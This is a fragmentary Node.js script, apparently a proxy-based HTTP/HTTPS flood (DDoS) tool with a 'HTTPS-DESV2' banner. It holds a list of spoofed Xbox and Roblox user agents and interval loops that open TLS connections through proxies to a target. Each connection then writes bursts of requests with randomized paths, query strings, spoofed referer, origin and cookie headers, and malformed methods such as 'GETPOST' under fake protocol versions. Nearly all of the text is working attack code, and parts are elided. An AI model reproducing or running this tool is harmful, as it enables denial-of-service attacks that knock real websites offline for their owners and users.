...
if (process.argv.length < 8){
    console.log('Support For HTTP/2 & SPDY/3.1 | HTTPS-DESV2');
...
"XBMC/3.5.3-r33027 (Xbox; http://www.xbmc.org)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Xbox/2003.1001.4.0 Chrome/69.0.3497.128 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, Like Gecko) Mobile/9B176 ROBLOX Xbox App 2.455.410643 Hybrid RobloxApp/2.455.410643 (GlobalDist; XboxAppStore)",
"Xbox/2.0.4548.0 UPnP/1.0 Xbox/2.0.4548.0",
"Microsoft/XboxScarlett/Series S/XboxScarlett/2020 , Cobalt (21.lts.4.3000801-gold),Xbox (10.0.22000.4158)",
            ...
            setInterval(() => {
                ...
                req.on('connect', function (res, socket, head) { 
                        ...
                        var tlsConnection = tls.connect({
                            ...
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + "POST" + ' ' + `${parsed.path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}` + ' SPDY/3.1\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
            ...
            setInterval(() => {
                ...
                req.on('connect', function (res, socket, head) { 
                        ...
                        var tlsConnection = tls.connect({
                            ...
                            for (let j = 0; j < rate; j++) {
                                tlsConnection.write("GET" + "POST" + "HEAD" + ' ' + `${parsed.path.replace("%RAND%",ra())}` + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: '+target+'\r\nOrigin: '+target+'\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%",ra()) : ""}` + '\r\n\r\n');
                            }
                            // tlsConnection.end();
                            // tlsConnection.destroy();
                        });
